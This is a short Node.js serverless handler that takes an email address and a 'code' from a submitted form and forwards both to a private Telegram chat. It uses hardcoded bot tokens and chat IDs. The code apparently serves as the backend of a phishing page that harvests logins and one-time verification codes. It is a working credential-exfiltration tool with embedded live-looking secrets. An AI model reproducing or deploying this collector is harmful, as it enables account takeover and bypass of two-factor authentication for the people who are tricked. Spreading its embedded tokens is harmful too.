module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
  const token2 = '8338192544:AAHrKxpty2ObdcTWgHSp_9CQStgRTjzXUxk';
  const chatId = '-5096357861';
  const chatId2 = '-5050388811';

  try {
    const { email, code } = req.body;

    const message = `
📩 NEW FORM

📧 Email: ${email}
🔑 code: ${code}
    `;

    const tgRes = await fetch(
      `https://api.telegram.org/bot${token2}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId2,
          text: message
        })
      }
    );

    const data = await tgRes.json();

    return res.status(200).json({
      ok: true,
      telegram: data
    });

  } catch (err) {
    return res.status(500).json({
      error: 'Server error',
      details: err.message
    });
  }
};
